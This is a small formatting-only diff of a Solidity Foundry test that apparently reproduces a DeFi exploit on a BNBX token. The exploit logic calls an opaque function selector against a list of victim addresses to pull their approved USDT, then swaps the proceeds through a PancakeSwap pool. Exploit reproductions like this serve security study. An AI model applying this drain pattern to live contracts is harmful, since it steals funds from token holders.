@@ -46,7 +46,7 @@ contract ContractTest is Test {
             uint256 available = balance <= allowance ? balance : allowance; // available USDT
 
             if (available > 0) {
-               BNBX_0x389a.call(abi.encodeWithSelector(bytes4(0x11834d4c), victims[i]));
+                BNBX_0x389a.call(abi.encodeWithSelector(bytes4(0x11834d4c), victims[i]));
             }
         }
         TOKENToWBNB();
@@ -60,12 +60,8 @@ contract ContractTest is Test {
 
         (uint256 reserveWBNB_after, uint256 reserveTOKEN_after,) = WBNB_BNBX_LpPool.getReserves();
 
-        amountOut = PancakeRouter.getAmountOut(
-            reserveTOKEN_after - reserveTOKEN,
-            reserveTOKEN,
-            reserveWBNB
-        );
-        WBNB_BNBX_LpPool.swap(amountOut, 0 , address(this), "");
+        amountOut = PancakeRouter.getAmountOut(reserveTOKEN_after - reserveTOKEN, reserveTOKEN, reserveWBNB);
+        WBNB_BNBX_LpPool.swap(amountOut, 0, address(this), "");
     }
 
     fallback() external payable {}
